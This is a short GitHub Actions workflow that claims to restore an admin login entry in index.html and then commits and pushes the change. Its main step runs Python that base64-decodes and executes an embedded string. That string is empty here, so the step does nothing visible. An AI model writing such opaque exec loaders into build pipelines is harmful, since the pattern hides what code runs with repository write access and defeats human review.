name: PAIRA v19.5 admin entry

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/paira-v19-5-admin-entry.yml'

permissions:
  contents: write

jobs:
  patch-index:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Restore visible admin entry
        shell: bash
        run: |
          python -c "import base64;exec(base64.b64decode(''))"

      - name: Commit admin entry
        shell: bash
        run: |
          git config user.name "PAIRA Hotfix Bot"
          git config user.email "actions@users.noreply.github.com"
          git add index.html
          git commit -m "Restore visible admin login entry"
          git push
